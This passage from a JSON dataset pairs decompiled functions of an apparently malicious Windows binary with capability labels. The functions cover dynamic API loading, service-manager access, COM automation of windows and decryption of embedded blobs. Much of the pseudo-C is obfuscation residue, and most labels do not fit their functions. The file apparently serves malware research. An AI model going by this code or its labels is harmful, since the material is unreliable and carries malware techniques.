        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402275) overlaps instruction at (ram,0x00402271)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nuint fcn.00402210(void)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    int32_t extraout_ECX_00;\n    code *pcVar5;\n    bool bVar6;\n    bool bVar7;\n    ulong uVar8;\n    \n    puVar2 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x407104);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (puVar2 == NULL) {\n        return 0;\n    }\n    bVar6 = false;\n    bVar7 = (puVar2 & 0x11cb) == 0;\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar2, 0x407114);\n    *0x422410 = uVar8;\n    if ((bVar6 || bVar7) || (iVar4 = extraout_ECX,  !bVar6 && !bVar7)) {\n        uVar8 = (*pcVar5)(puVar2, 0x407130);\n        *0x422414 = uVar8;\n        iVar4 = extraout_ECX_00;\n    }\n    iVar3 = uVar8;\n    _pe_dos_header = *puVar2;\n    pcVar5 = pcVar5 & 0xffff0000 | CONCAT11(0xdf, pcVar5);\n    *(iVar4 + 0x40) = *(iVar4 + 0x40) ^ uVar8 >> 0x28;\n    *(puVar2 + 3) = *(puVar2 + 3) + (uVar8 >> 0x20);\n    piVar1 = pcVar5 + 0x422414;\n    *piVar1 = *piVar1 << (iVar4 & 0x1f);\n    *(iVar3 + -4) = uVar8 >> 0x20;\n    *(iVar3 + -8) = 4;\n    *(iVar3 + -4) = 0x407140;\n    *(iVar3 + -8) = puVar2 + 1;\n    *(iVar3 + -0xc) = 0x4022a8;\n    *0x422418 = (*pcVar5)();\n    if (((*0x422410 != 0) && (*0x422414 != 0)) && (*0x422418 != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 599
    },
    "004028f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00402b1e) overlaps instruction at (ram,0x00402b1d)\n// \n// WARNING: Removing unreachable block (ram,0x004029db)\n\nvoid __fastcall fcn.004028f0(uint32_t param_1)\n\n{\n    uchar uVar1;\n    uint8_t extraout_AH;\n    uint8_t extraout_AH_00;\n    int32_t *arg_14h;\n    uint16_t extraout_CX;\n    uint8_t extraout_CH_01;\n    uint8_t extraout_CH;\n    uint8_t uVar3;\n    uchar *extraout_ECX;\n    uint8_t extraout_CH_00;\n    uchar *extraout_ECX_00;\n    uchar *puVar2;\n    uchar *extraout_ECX_01;\n    char extraout_DL;\n    ushort extraout_DX;\n    int32_t extraout_EDX;\n    uint8_t uVar7;\n    int32_t extraout_EDX_00;\n    int32_t extraout_EDX_01;\n    int32_t iVar5;\n    uint8_t extraout_DH;\n    uint8_t *puVar6;\n    uint16_t unaff_BX;\n    uint32_t uVar8;\n    uint *unaff_ESI;\n    uint *unaff_EDI;\n    uint *puVar9;\n    uint *puVar10;\n    uchar uVar11;\n    uchar uVar12;\n    bool bVar13;\n    bool in_OF;\n    bool bVar14;\n    bool bVar15;\n    ulong uVar16;\n    uint unaff_retaddr;\n    uint8_t uStackY172;\n    uint32_t uVar17;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint uVar18;\n    uint uVar19;\n    uint arg_10h;\n    uint arg_10h_00;\n    uint32_t arg_14h_00;\n    uint *puVar20;\n    ushort in_stack_fffffff0;\n    ushort in_stack_fffffff2;\n    char cVar4;\n    \n    if ((in_OF) || (!in_OF)) {\n        in_stack_fffffff0 = 0x11;\n        in_stack_fffffff2 = 0;\n    }\n    uVar11 = 0;\n    bVar14 = false;\n    uVar12 = (param_1 & *(param_1 + 0x87cb1757)) == 0;\n    puVar20 = 0x4223f0;\n    fcn.00401420(0x4223f0, 10, 0x407010, CONCAT22(in_stack_fffffff2, in_stack_fffffff0));\n    if ((!bVar14) && (bVar14)) {\n        *puVar20 = unaff_retaddr;\n        return;\n    }\n    fcn.00401420(0x4223f0, 10, 0x40722c, 0xf);\n    if ((!bVar14) && (bVar14)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    arg_10h = 0x40723c;\n    uVar19 = 10;\n    uVar18 = 0x40297b;\n    fcn.00401420(0x4223f0, 10, 0x40723c, 0x1a);\n    if ((uVar11 || uVar12) || (!uVar11 && !uVar12)) {\n        uVar18 = 10;\n        in_stack_ffffffbc = 0x407290;\n        in_stack_ffffffb8 = 10;\n        uVar3 = extraout_CH;\n    }\n    else {\n        *unaff_EDI = *unaff_ESI;\n        unaff_BX = CONCAT11(0xdf, unaff_BX);\n        uVar3 = extraout_CH | uStackY172;\n        unaff_ESI = unaff_ESI + 1;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    *(extraout_EDX + 10) = *(extraout_EDX + 10) + uVar3;\n    uVar17 = 0x4223f0;\n    fcn.00401420(0x4223f0, in_stack_ffffffb8, in_stack_ffffffbc, uVar18);\n    fcn.00401420(0x4223f0, 10, 0x40729c, 0xb);\n    uVar8 = unaff_BX;\n    fcn.00401420(0x4223f0, 10, 0x4072a8, 8);\n    fcn.00401420(0x4223f0, 10, 0x4072b0, 9);\n    fcn.00401420(0x4223f0, 10, 0x4072bc, 9);\n    uVar3 = extraout_DX;\n    uVar7 = extraout_DX >> 8;\n    uVar11 = CARRY1(uVar3, uVar7);\n    bVar14 = SCARRY1(uVar3, uVar7);\n    uVar12 = uVar3 + uVar7 == '\\0';\n    puVar20 = 0x4223f0;\n    fcn.00401420(0x4223f0, 10, 0x4072c8, 9);\n    if ((!bVar14) && (bVar14)) {\n        *puVar20 = unaff_retaddr;\n        return;\n    }\n    arg_14h_00 = 0xc;\n    arg_10h_00 = 0x4072d4;\n    uVar18 = 0x402aa5;\n    fcn.00401420(0x4223f0, 10, 0x4072d4, 0xc);\n    if ((uVar11 || uVar12) || (!uVar11 && !uVar12)) {\n        uVar18 = 3;\n        arg_10h = 0x4072e0;\n        uVar19 = 10;\ncode_r0x00402ac5:\n        *(extraout_EDX_00 + 10) = *(extraout_EDX_00 + 10) + (extraout_ECX >> 8);\n        fcn.00401420(0x4223f0, uVar19, arg_10h, uVar18);\n        uVar11 = 0;\n        bVar14 = false;\n        uVar12 = ((extraout_CH_00 ^ extraout_AH) + 1 & 0x27) == 0;\n        uVar17 = 0x402afc;\n        fcn.00401420(0x4223f0, 10, 0x4072e4, 10);\n        puVar2 = extraout_ECX_00;\n        iVar5 = extraout_EDX_01;\n        puVar20 = unaff_ESI;\n        puVar9 = unaff_EDI;\n        if (bVar14) goto code_r0x00402b20;\n        arg_14h_00 = uVar17 & 0xffff | extraout_EDX_01 << 0x10;\n    }\n    else {\n        puVar9 = unaff_EDI + 1;\n        puVar20 = unaff_ESI + 1;\n        *unaff_EDI = *unaff_ESI;\n        uVar8 = CONCAT11(0xdf, unaff_BX);\n        uVar11 = 0x951e7e2f < uVar17;\n        bVar14 = SCARRY4(uVar17, 0x6ae181d0);\n        uVar12 = uVar17 == 0x951e7e30;\n        unaff_ESI = puVar20;\n        unaff_EDI = puVar9;\n        if (!uVar11) goto code_r0x00402ac5;\n        iVar5 = 0x5a667a78;\n        puVar2 = extraout_ECX;\n    }\n    if (!bVar14) {\ncode_r0x00402b20:\n        cVar4 = puVar2 >> 8;\n        arg_14h_00 = 0x40;\n        arg_10h_00 = 0x4072f0;\n        uVar18 = 10;\n        puVar10 = puVar9;\n        goto code_r0x00402b26;\n    }\n    puVar10 = puVar9 + 1;\n    uVar1 = in(iVar5);\n    *puVar9 = uVar1;\n    if (!uVar11 && !uVar12) {\n        return;\n    }\n    uVar18 = 0x56;\n    uVar8 = CONCAT11(*puVar2, 0xbc);\n    while( true ) {\n        cVar4 = puVar2 >> 8;\n        if (uVar11) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\ncode_r0x00402b26:\n        *(iVar5 + 10) = *(iVar5 + 10) + cVar4;\n        fcn.00401420(0x4223f0, uVar18, arg_10h_00, arg_14h_00);\n        bVar14 = false;\n        bVar15 = false;\n        bVar13 = (uVar8 & extraout_CX) == 0;\n        uVar17 = 0x402b4e;\n        uVar16 = fcn.00401420(0x4223f0, 10, 0x407330, 0xc);\n        iVar5 = uVar16 >> 0x20;\n        if (bVar14 || bVar13) break;\n        arg_14h_00 = uVar17 & 0xffff | puVar20 << 0x10;\n        puVar20 = puVar20 & 0xffff;\n        if (!bVar14 && !bVar13) break;\n        if (!bVar15) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        uVar11 = *(uVar16 + -0xf97bf96) < puVar10;\n        puVar2 = extraout_ECX_01;\n    }\n    uVar19 = 0x40733c;\n    uVar18 = 10;\n    fcn.00401420(0x4223f0, 10, 0x40733c, 0xb);\n    fcn.00401420(0x4223f0, 10, 0x407348, 4);\n    uVar3 = uVar8 >> 8 < extraout_DH;\n    bVar14 = puVar10 + -1 < 0;\n    uVar16 = fcn.00401420(0x4223f0, 10, 0x40734c, 4);\n    puVar6 = uVar16 >> 0x20;\n    if ((bVar14) || (!bVar14)) {\n        arg_14h = 0xc;\n        uVar19 = 0x407350;\n        uVar18 = 10;\n    }\n    else {\n        uVar8 = uVar16 + 0x680c6a2f;\n        arg_14h = uVar8 + uVar3;\n        if (uVar16 < 0x97f395d1 && !CARRY4(uVar8, uVar3)) {\n            *arg_14h = *arg_14h - arg_14h;\n            bVar14 = CARRY1(*puVar6, extraout_CH_01);\n            *puVar6 = *puVar6 + extraout_CH_01;\n            goto code_r0x00402c33;\n        }\n    }\n    puVar6[10] = puVar6[10] + extraout_CH_01;\n    fcn.00401420(0x4223f0, uVar18, uVar19, arg_14h);\n    fcn.00401420(0x4223f0, 10, 0x40735c, 4);\n    bVar14 = extraout_DL + 0x15U < extraout_AH_00;\ncode_r0x00402c33:\n    uVar18 = fcn.00401420(0x4223f0, 10, 0x407360, 9);\n    if ((!bVar14) && (bVar14)) {\n        out(0xbd, uVar18);\n        return;\n    }\n    fcn.00401420(0x4223f0, 10, 0x40736c, 0x16);\n    fcn.00401420(0x4223f0, 10, 0x407384, 7);\n    return;\n}\n",
        "token_count": 2834
    },
    "null": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "004030f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004030f0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00403120": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x004031cd) overlaps instruction at (ram,0x004031c9)\n// \n// WARNING: Removing unreachable block (ram,0x00403150)\n// WARNING: Removing unreachable block (ram,0x0040315a)\n\nbool fcn.00403120(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *unaff_ESI;\n    uint *puVar3;\n    bool bVar4;\n    uchar uStack272;\n    uchar auStack271 [259];\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    uStack272 = 0;\n    uStack8 = 0x104;\n    puVar3 = auStack271;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x407460, 0x407488, auStack12, &uStack272, &uStack8);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&uStack272, 0x2e);\n    bVar4 = puVar1 == NULL;\n    if (bVar4) {\n        return false;\n    }\n    if ((!bVar4) && (bVar4)) {\n        *(puVar3 + 3) = *unaff_ESI;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&uStack272);\n    if (iVar2 != 6) {\n        return iVar2 == 7;\n    }\n    return true;\n}\n",
        "token_count": 468
    },
    "004032b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.004032b0(int32_t *hWnd)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *in_FS_OFFSET;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405200;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x4073f8);\n    if (iVar1 == 0) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = iVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x407404);\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(hWnd, uVar2, 0, 0, 2, 1000, &var_18h);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x407418);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    hWnd = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &hWnd);\n                    if ((iVar4 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x004036d1:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x004036dd:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00403698:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x004036dd;\n                    }\n                    if (pbstr == 0) {\njoined_r0x004034d4:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.004030f0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x40742c);\n                        if (iVar1 != 0) goto joined_r0x004034d4;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x0040367d:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x004036d1;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar1 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x0040367d;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar6 = &var_147h;\n                            for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n                                *puVar6 = 0;\n                                puVar6 = puVar6 + 1;\n                            }\n                            *puVar6 = 0;\n                            *(puVar6 + 2) = 0;\n                            fcn.004030f0(iVar1, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar1 = fcn.00403200(&var_148h);\n                            if (iVar1 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00403698;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            iVar1 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                iVar1 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(iVar1);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2452
    },
    "004037f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004037f0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_108h;\n    uint var_107h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)(arg_8h, &var_4h);\n    if (arg_ch != var_4h) {\n        return 1;\n    }\n    var_108h = 0;\n    puVar2 = &var_107h;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)(arg_8h, &var_108h, 0x104);\n    iVar1 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_108h, 0x4073d4);\n    if (iVar1 != 0) {\n        return 1;\n    }\n    (*_sym.imp.USER32.dll_EnumChildWindows)(arg_8h, 0x403770, 0);\n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    (*_sym.imp.KERNEL32.dll_Sleep)((iVar1 % 10 + 4) * 1000);\n    (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n    return 0;\n}\n",
        "token_count": 376
    },
    "00403db0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403dd6) overlaps instruction at (ram,0x00403dd2)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00403db0(char *arg_8h, int32_t arg_ch, char *arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    char *pcVar4;\n    bool bVar5;\n    bool bVar6;\n    \n    bVar6 = SCARRY4(arg_8h - arg_14h, arg_ch);\n    pcVar1 = (arg_8h - arg_14h) + arg_ch;\n    bVar5 = pcVar1 == NULL;\n    if ((bVar5 || bVar6 != pcVar1 < 0) || (!bVar5 && bVar6 == pcVar1 < 0)) {\n        bVar5 = arg_14h == 0;\n    }\n    if (!bVar5) {\n        if (arg_8h <= pcVar1) {\n            do {\n                if (*arg_8h == *arg_10h) {\n                    iVar2 = arg_14h + -1;\n                    bVar5 = true;\n                    pcVar4 = arg_10h + 1;\n                    pcVar3 = arg_8h;\n                    do {\n                        pcVar3 = pcVar3 + 1;\n                        if (iVar2 == 0) break;\n                        iVar2 = iVar2 + -1;\n                        bVar5 = *pcVar3 == *pcVar4;\n                        pcVar4 = pcVar4 + 1;\n                    } while (bVar5);\n                    if (bVar5) {\n                        return arg_8h;\n                    }\n                }\n                arg_8h = arg_8h + 1;\n            } while (arg_8h <= pcVar1);\n        }\n        arg_8h = NULL;\n    }\n    return arg_8h;\n}\n",
        "token_count": 448
    },
    "00403e40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403e85) overlaps instruction at (ram,0x00403e82)\n// \n\nuint __cdecl fcn.00403e40(int32_t arg_8h)\n\n{\n    uint16_t in_AX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint8_t extraout_DL;\n    bool bVar3;\n    uint uVar4;\n    \n    bVar3 = (in_AX & 0x11cb) == 0;\n    uVar4 = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((bVar3) || (iVar2 = iVar1,  !bVar3)) {\n        iVar2 = arg_8h;\n    }\n    *(iVar2 + 0x56) = *(iVar2 + 0x56) | extraout_DL;\n    uVar4 = fcn.00404910(0x47, uVar4);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar4;\n}\n",
        "token_count": 250
    },
    "00403eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403eb0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403f40(&var_68h, &var_4h);\n    fcn.00401870(&var_68h, var_4h, 0x407490, 0x9f60);\n    *arg_8h = 0x407490;\n    *arg_ch = 0x9f60;\n    return;\n}\n",
        "token_count": 241
    },
    "00403f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040409f) overlaps instruction at (ram,0x0040409d)\n// \n// WARNING: Removing unreachable block (ram,0x0040409c)\n\nuint64_t __cdecl fcn.00403f40(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint16_t in_AX;\n    uint16_t uVar1;\n    uint32_t uVar2;\n    int16_t in_CX;\n    uint32_t in_EDX;\n    char unaff_BL;\n    uchar *puVar3;\n    uchar *puVar4;\n    uint32_t unaff_EDI;\n    bool bVar5;\n    \n    *arg_8h = 0x58;\n    arg_8h[1] = 0x15;\n    arg_8h[2] = 0x12;\n    uVar1 = (in_AX & 0xff | ((in_AX >> 8) - unaff_BL) + 0x4d << 8) & 0x26ae;\n    uVar2 = in_AX;\n    arg_8h[3] = 0x31;\n    puVar3 = arg_8h;\n    if ((uVar1 != 0) && (uVar1 == 0)) {\n        puVar3 = arg_8h + -1;\n        *(unaff_EDI | &stack0xfffffffc) = in_AX;\n        in_EDX = in_EDX & 0xffffff00;\n        uVar2 = in_AX + (uVar2 >> 8) * 'y';\n    }\n    puVar3[4] = 0x7f;\n    puVar3[5] = 0xc0;\n    puVar3[6] = 0xef;\n    puVar3[7] = 0x3f;\n    bVar5 = in_EDX == 'Q';\n    puVar3[8] = 0xa8;\n    if ((bVar5) || (!bVar5)) {\n        puVar3[9] = 0x92;\n    }\n    *(in_EDX + 0x52665166) = *(in_EDX + 0x52665166) | in_EDX;\n    puVar3[10] = 0xcf;\n    puVar3[0xb] = 0xd7;\n    bVar5 = ((in_CX + 1U & 0xff | (in_CX + 1U >> 8 & uVar2 + 2U) << 8) & 0x7bc9) == 0;\n    puVar4 = puVar3;\n    if ((!bVar5) && (bVar5)) {\n        puVar4 = puVar3 + 1;\n        out(*puVar3, 0x47);\n    }\n    puVar4[0xc] = 0x70;\n    puVar4[0xd] = 199;\n    puVar4[0xe] = 0xd1;\n    arg_8h[0xf] = 0x31;\n    *arg_ch = 0x10;\n    return CONCAT44(in_EDX, arg_8h) & 0xffff0000ffffffff | 0x4700000000;\n}\n",
        "token_count": 710
    },
    "00404280": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404280(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404310(&var_68h, &var_4h);\n    fcn.00401870(&var_68h, var_4h, 0x4113f0, 0x11000);\n    *arg_8h = 0x4113f0;\n    *arg_ch = 0x11000;\n    return;\n}\n",
        "token_count": 241
    },
    "00404310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
